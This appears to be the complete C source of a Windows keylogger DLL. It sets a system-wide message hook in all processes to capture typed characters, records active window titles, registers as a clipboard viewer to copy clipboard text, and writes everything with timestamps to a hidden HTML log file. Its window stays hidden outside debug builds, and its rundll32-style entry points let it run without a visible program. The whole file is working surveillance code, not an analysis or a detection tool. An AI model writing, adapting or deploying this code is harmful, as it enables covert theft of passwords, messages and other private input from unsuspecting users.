
#include "svkl.h"

// section in this dll that's shared between the instances
// loaded in different processes
#pragma data_seg(".shared")
// the hook
HHOOK g_hHook = NULL;
// the main window
HWND g_hWndMain = NULL;
#pragma data_seg()
// mark this section as read|write|shared
#pragma comment(linker, "/section:.shared,RWS") 

// The handle to the instance of this dll.
HINSTANCE g_hInstanceDLL;
// Log file
static HANDLE g_hFile = INVALID_HANDLE_VALUE;
// Mutex
static HANDLE g_hMutex = NULL;
// Clipboard viewer
static HWND g_hWndClipboard = NULL;

BOOL CreateLog(LPTSTR lpszFileName)
{
	OutputDebug(TEXT("CreateLog"));
	g_hFile = CreateFile(lpszFileName, FILE_APPEND_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if(g_hFile != INVALID_HANDLE_VALUE)
	{
		g_hMutex = CreateMutex(NULL, FALSE, MUTEX_NAME);
		if(g_hMutex != NULL)
		{
			OutputDebug(lpszFileName);
			return TRUE;
		}
		CloseHandle(g_hFile);
	}
	return FALSE;
}

VOID CloseLog(VOID)
{
	OutputDebug(TEXT("CloseLog"));
	if(g_hFile != INVALID_HANDLE_VALUE) CloseHandle(g_hFile);
	if(g_hMutex != NULL) CloseHandle(g_hMutex);
}

BOOL APIENTRY DllMain(HINSTANCE hInstanceDLL, DWORD fdwReason, LPVOID lpvReserved)
{
	switch(fdwReason)
	{
	case DLL_PROCESS_ATTACH:
		g_hInstanceDLL = hInstanceDLL;
		return TRUE; //DisableThreadLibraryCalls(hInstanceDLL);
	}
	return TRUE;
}

LRESULT CALLBACK HookProc(int code, WPARAM wParam, LPARAM lParam)
{
	MSG * pMsg;
	if(code == HC_ACTION && wParam == PM_REMOVE) 
	{
		pMsg = (MSG *) lParam;
		switch(pMsg->message)
		{
			case WM_CHAR: PostMessage(g_hWndMain, WM_EVENT_CHAR, pMsg->wParam, pMsg->lParam); break;
			case WM_GETTEXT: PostMessage(g_hWndMain, WM_EVENT_GETTEXT, 0, 0); break;
			case WM_ACTIVATE: PostMessage(g_hWndMain, WM_EVENT_GETTEXT, 0, 0); break;
		}
	}
	return CallNextHookEx(g_hHook, code, wParam, lParam);
}

void CALLBACK StartA(HWND hWnd, HINSTANCE hInstance, LPSTR lpszCmdLine, int nCmdShow)
{
#if defined(UNICODE) || defined(_UNICODE)
	int len;
	LPWSTR lpwszCmdLine;
	OutputDebug(TEXT("StartA"));
	if(lpszCmdLine == NULL) return;
	len = lstrlenA(lpszCmdLine);
	lpwszCmdLine = MemAlloc((len + 1) * sizeof(WCHAR), HEAP_ZERO_MEMORY);
	if(lpwszCmdLine != NULL)
	{
		MultiByteToWideChar(CP_ACP, 0, lpszCmdLine, len, lpwszCmdLine, len);
		Start(hWnd, hInstance, lpwszCmdLine, nCmdShow);
		MemFree(lpwszCmdLine);
	}
#else
	OutputDebug(TEXT("StartA"));
	Start(hWnd, hInstance, lpszCmdLine, nCmdShow);
#endif
}

void CALLBACK StartW(HWND hWnd, HINSTANCE hInstance, LPWSTR lpszCmdLine, int nCmdShow)
{
#if defined(UNICODE) || defined(_UNICODE)
	OutputDebug(TEXT("StartW"));
	Start(hWnd, hInstance, lpszCmdLine, nCmdShow);
#else
	int lenCmdLine;
	DWORD cbCmdLine;
	LPSTR lpaszCmdLine;
	OutputDebug(TEXT("StartW"));
	if(lpszCmdLine == NULL) return;
	lenCmdLine = lstrlenW(lpszCmdLine);
	cbCmdLine = WideCharToMultiByte(CP_ACP, 0, lpszCmdLine, lenCmdLine + 1, NULL, 0, NULL, NULL);
	lpaszCmdLine = MemAlloc(cbCmdLine, HEAP_ZERO_MEMORY);
	if(lpaszCmdLine != NULL)
	{
		WideCharToMultiByte(CP_ACP, 0, lpszCmdLine, lenCmdLine + 1, lpaszCmdLine, cbCmdLine, NULL, NULL);
		Start(hWnd, hInstance, lpaszCmdLine, nCmdShow);
		MemFree(lpaszCmdLine);
	}
#endif
}

void CALLBACK Start(HWND hWndClipboard, HINSTANCE hReserved, LPTSTR lpqszLogFile, int bClipboard)
{
	TCHAR * pChar;
	OutputDebug(TEXT("Start"));
	OutputDebug(lpqszLogFile);
	lpqszLogFile = _tcschr(lpqszLogFile, '\"');
	pChar = _tcsrchr(lpqszLogFile, '\"');
	if(lpqszLogFile != NULL && pChar != NULL && pChar > lpqszLogFile)
	{
		*lpqszLogFile++ = 0;
		*pChar = 0;
		WndCreate(bClipboard && CreateLog(lpqszLogFile));
	}
	ELSE_OutputDebug(TEXT("Wrong commandline parameters or format"));
}

BOOL WndCreate(BOOL bClipboard)
{
	WNDCLASSEX wc;
	MSG msg;
	HWND hWnd;
	OutputDebug(TEXT("WndCreate"));
	RtlZeroMemory(&wc, sizeof(WNDCLASSEX));
	wc.cbSize = sizeof(WNDCLASSEX);
	wc.style = CS_DBLCLKS;
	wc.hInstance = g_hInstanceDLL;
	wc.lpfnWndProc = WndProc; 
	wc.hCursor = LoadCursor(NULL, IDC_ARROW);
	wc.hbrBackground = (HBRUSH)(COLOR_BTNFACE + 1);
	wc.lpszClassName = WINDOW_CLASSNAME;
	if(!RegisterClassEx(&wc))
		return FALSE;
	if(!bClipboard)
	{
		Sleep(666);
		g_hWndMain = FindWindow(WINDOW_CLASSNAME, NULL);
	}	
	hWnd = CreateWindowEx(0, WINDOW_CLASSNAME, NULL, WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, NULL, NULL, g_hInstanceDLL, (LPVOID) bClipboard);
	if(hWnd == NULL)
	{
		OutputLastError(TEXT("CreateWindowEx"));
		return FALSE;
	}
	if(bClipboard) g_hWndMain = hWnd;
#ifdef DEBUG
	ShowWindow(hWnd, SW_SHOW);
#endif
	while(GetMessage(&msg, NULL, 0, 0) > 0)
	{
		//TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	return msg.wParam;
}

LRESULT CALLBACK WndProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	OSVERSIONINFO osvi;
	CHANGEFILTERSTRUCT cfs;
	switch(uMsg)
	{
	case WM_EVENT_CHAR:
		WriteWnd(FALSE);
		WriteChar(wParam, lParam);
		break;

	case WM_EVENT_GETTEXT:
		WriteWnd(TRUE);
		break;

	case WM_DRAWCLIPBOARD:
		OutputDebug(TEXT("WM_DRAWCLIPBOARD"));
		WriteWnd(FALSE);
		WriteClipboard();
		break;

	case WM_CHANGECBCHAIN:
		OutputDebug(TEXT("WM_CHANGECBCHAIN"));
		if((HWND) wParam == g_hWndClipboard)
		{
        	g_hWndClipboard = (HWND) lParam; 
		}
     	else if (g_hWndClipboard != NULL) 
		{
      		SendMessage(g_hWndClipboard, uMsg, wParam, lParam); 
		} 
		break;

	case WM_CREATE:
		OutputDebug(TEXT("WM_CREATE"));
		RtlZeroMemory(&osvi, sizeof(OSVERSIONINFO));
		osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
		if(!GetVersionEx(&osvi)) return -1;
		if(osvi.dwMajorVersion == 6 && osvi.dwMinorVersion == 0)
		{
			if(!ChangeWindowMessageFilter(WM_EVENT_CHAR, MSGFLT_ADD)) return -1;
			if(!ChangeWindowMessageFilter(WM_EVENT_GETTEXT, MSGFLT_ADD)) return -1;
		}
		else if(osvi.dwMajorVersion >= 6)
		{
			RtlZeroMemory(&cfs, sizeof(CHANGEFILTERSTRUCT));
			cfs.cbSize = sizeof(CHANGEFILTERSTRUCT);
			if(!ChangeWindowMessageFilterEx(hWnd, WM_EVENT_CHAR, MSGFLT_ALLOW, &cfs)) return -1;
			if(!ChangeWindowMessageFilterEx(hWnd, WM_EVENT_GETTEXT, MSGFLT_ALLOW, &cfs)) return -1;
		}
		g_hHook = SetWindowsHookEx(WH_GETMESSAGE, (HOOKPROC)HookProc, g_hInstanceDLL, 0);
		if(g_hHook != NULL) 
		{
			if(((BOOL)((LPCREATESTRUCT) lParam)->lpCreateParams)) // <- bClipboard
			{
				g_hWndClipboard = SetClipboardViewer(hWnd);
				if(g_hWndClipboard != NULL || GetLastError() == 0) break;
				ELSE_OutputLastError(TEXT("SetClipboardViewer"));
			} 
			break;
		}
		ELSE_OutputLastError(TEXT("SetWindowsHookEx"));
		return -1;

	case WM_DESTROY: 
		OutputDebug(TEXT("WM_DESTROY"));
		if(g_hHook != NULL) UnhookWindowsHookEx(g_hHook);
		ChangeClipboardChain(hWnd, g_hWndClipboard);
		PostQuitMessage(0);
		break;

	default:
		 return DefWindowProc(hWnd, uMsg, wParam, lParam);
	}
	return 0;
}

inline VOID WriteChar(WPARAM wParam, LPARAM lParam)
{
	int iLen;
	CHAR szKey[66];

	if((WCHAR)wParam < 32 && ((WCHAR)wParam != 10 && (WCHAR)wParam != 13))
	{
		szKey[0] = '['; 
		iLen = GetKeyNameTextA(lParam, &szKey[1], 64);
		szKey[iLen + 1] = ']';
		szKey[iLen + 2] = 0;
		OutputDebugStringA(szKey);
		WriteLog((PBYTE)szKey, iLen + 2);
	}
	else
	{
		switch((WCHAR)wParam)
		{
			case '<': WriteLog((PBYTE)"&lt;", 4); break;
			case '>': WriteLog((PBYTE)"&gt;", 4); break;
			case '&': WriteLog((PBYTE)"&amp;", 5); break; 
			case '\'': WriteLog((PBYTE)"&apos;", 6); break;
			case '\"': WriteLog((PBYTE)"&quot;", 6); break;
			default:
				iLen = (int)WideCharToMultiByte(CP_UTF8, 0, (LPCWSTR)&wParam, 1, szKey, 8, NULL, NULL);
				if(iLen > 0) WriteLog((PBYTE)szKey, iLen);
				break;
		}
	}
}

inline VOID WriteClipboard(VOID)
{
	HANDLE hData;
	LPWSTR lpwString;
	OutputDebug(TEXT("WriteClipboard"));
	if(!OpenClipboard(NULL)) return;
	hData = GetClipboardData(CF_UNICODETEXT);
	if(hData != NULL)
	{
		lpwString = GlobalLock(hData);
		WriteEvent("CLIPBOARD", lpwString);
		GlobalUnlock((HGLOBAL)hData);
	}
	CloseClipboard();
} 

VOID WriteEvent(LPSTR lpszEvent, LPWSTR lpszData)
{
	static CHAR szFormat[] = "</pre><p>%s %04d-%02d-%02d %02d:%02d:%02d<br/><b>%s</b></p><pre>";
	SYSTEMTIME st;
	DWORD cb, cbUtf8, cbEscaped;
	CHAR * lpszUtf8, * lpszEscaped, * pUtf8, *pEscaped;
	OutputDebug(TEXT("WriteEvent"));
	cb = lstrlenW(lpszData) + 1;
	cbUtf8 = WideCharToMultiByte(CP_UTF8, 0, lpszData, cb, NULL, 0, NULL, NULL);
	lpszUtf8 = MemAlloc(cbUtf8, 0);
	if(lpszUtf8 == NULL) return;
	WideCharToMultiByte(CP_UTF8, 0, lpszData, cb, lpszUtf8, cbUtf8, NULL, NULL);
	cbEscaped = cbUtf8 + 1;
	pUtf8 = lpszUtf8;
	while(*pUtf8)
	{
		switch(*pUtf8++)
		{
			case '&': cbEscaped += 5; break; 
			case '<': case '>':	cbEscaped += 4;	break;
			case '\'': case '\"': cbEscaped += 6; break;
		}
	}
	lpszEscaped = MemAlloc(cbEscaped, 0);
	if(lpszEscaped != NULL)
	{
		pUtf8 = lpszUtf8;
		pEscaped = lpszEscaped;
		while(*pUtf8)
		{
			switch(*pUtf8)
			{
				case '&': 
					lstrcatA(pEscaped, "&amp;");
					pEscaped += 5; 
					break; 
				case '\"':
					lstrcatA(pEscaped, "&quot;");
					pEscaped += 6;
					break;
				case '\'': 
					lstrcatA(pEscaped, "&apos;");
					pEscaped += 6;
					break;
				case '<':
					lstrcatA(pEscaped, "&lt;");
					pEscaped += 4;
					break;
				case '>':
					lstrcatA(pEscaped, "&gt;");
					pEscaped += 4;
					break;
				default:
					*pEscaped++ = *pUtf8;
			}
			pUtf8++;
		}
		*pEscaped = 0;
		MemFree(lpszUtf8);
		lpszUtf8 = MemAlloc(cbEscaped + 96 + lstrlenA(lpszEvent), 0);
		if(lpszUtf8 != NULL) 
		{
			GetSystemTime(&st);
			sprintf(lpszUtf8, szFormat, lpszEvent, st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond, lpszEscaped);
			WriteLog((PBYTE)lpszUtf8, lstrlenA(lpszUtf8));
			MemFree(lpszUtf8);
		}
		MemFree(lpszEscaped);
	}
}

BOOL WriteLog(PBYTE pData, DWORD cbData)
{
	DWORD dwWritten;
	BOOL result;
	OutputDebug(TEXT("WriteLog"));
	result = FALSE;
	if(WaitForSingleObject(g_hMutex, INFINITE) == WAIT_OBJECT_0)
	{
		result = WriteFile(g_hFile, pData, cbData, &dwWritten, NULL);
		ReleaseMutex(g_hMutex);
	}
	return result;
}

VOID WriteWnd(BOOL bForce)
{
	static HWND hWndForeground = NULL;
	LPWSTR lpszWndText;
	HWND hWnd;
	int iLen;
	OutputDebug(TEXT("WriteWnd"));
	if(bForce || hWndForeground != (hWnd = GetForegroundWindow()))
	{
		if(!bForce) hWndForeground = hWnd;
		else hWndForeground = GetForegroundWindow();
		iLen = GetWindowTextLengthW(hWndForeground) + 1;
		lpszWndText = MemAlloc(iLen * sizeof(WCHAR), HEAP_ZERO_MEMORY);
		if(lpszWndText != NULL)
		{
			if(GetWindowTextW(hWndForeground, lpszWndText, iLen) > 0)
			{
				WriteEvent("WINDOW", lpszWndText);
			}
#ifdef DEBUG
			else if(GetLastError() != 0) OutputLastError(TEXT("GetWindowTextW"));
#endif
			MemFree(lpszWndText);
		}
		ELSE_OutputLastError(TEXT("HeapAlloc"));
	}
}

